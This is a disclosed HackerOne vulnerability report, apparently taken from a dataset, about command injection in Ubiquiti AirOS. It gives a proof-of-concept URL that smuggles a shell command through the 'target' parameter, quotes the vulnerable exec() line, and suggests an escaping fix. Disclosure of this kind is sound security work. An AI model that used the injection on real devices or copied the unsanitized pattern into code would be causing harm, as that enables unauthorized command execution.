---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '119317'
original_report_id: '119317'
title: Read-Only user can execute arbitraty shell commands on AirOS
weakness: Command Injection - Generic
team_handle: ui
created_at: '2016-02-28T19:21:10.574Z'
disclosed_at: '2016-08-05T09:36:35.197Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
- command-injection-generic
---

# Read-Only user can execute arbitraty shell commands on AirOS

## Metadata

- HackerOne Report ID: 119317
- Weakness: Command Injection - Generic
- Program: ui
- Disclosed At: 2016-08-05T09:36:35.197Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

On the last version of AirOS (including the 8.0 beta) is possible to a read-only user to inject shell commands.

Is possible to exploit the vulnerability using the following URL (adjusting the `airosid` value to a valid session):
```
https://192.168.0.21/sptest_action.cgi?ticket=426&action=start&target=192.168.0.100%3Btouch%20/tmp/vulnerable%3B&port=80&airosid=30171452416bb910e94ce2f802d73b89&_=1456685928091
```


The vulnerability happen in the 'sptest.inc:46', that don't sanitizes the user input. The Vulnerable code:
```
exec("echo " + $ticket + " init " + $target + " > /proc/net/spdtst/stctl", $lines, $res);
```

Possible mitigation:
```
exec("echo " + EscapeShellCmd($ticket) + " init " + EscapeShellCmd($target) + " > /proc/net/spdtst/stctl", $lines, $res);
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
